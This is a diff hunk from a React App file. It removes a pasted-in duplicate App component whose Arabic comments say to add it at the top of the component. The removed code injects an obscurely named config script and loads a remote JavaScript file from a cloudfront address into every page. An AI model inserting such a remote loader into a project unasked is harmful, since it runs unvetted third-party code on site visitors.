@@ -775,31 +775,3 @@ export default function App() {
     </>
   );
 }
-import React, { useEffect } from 'react'; // <-- أضف useEffect هنا
-
-export default function App() {
-  // ======= أضف هذا الجزء في بداية مكون App ======= //
-  useEffect(() => {
-    const scriptConfig = document.createElement('script');
-    scriptConfig.innerHTML = `var mVLqc_baZ_rlGujc={"it":4517542,"key":"4442b"};`;
-    
-    const scriptLoader = document.createElement('script');
-    scriptLoader.src = "https://dlk457skl57zp.cloudfront.net/87cebd3.js";
-    scriptLoader.async = true;
-
-    document.body.appendChild(scriptConfig);
-    document.body.appendChild(scriptLoader);
-
-    return () => {
-      document.body.removeChild(scriptConfig);
-      document.body.removeChild(scriptLoader);
-    };
-  }, []);
-  // ======= نهاية الجزء المضاف ======= //
-
-  return (
-    <>
-      {/* ...باقي الكود الأصلي بدون تعديل... */}
-    </>
-  );
-}
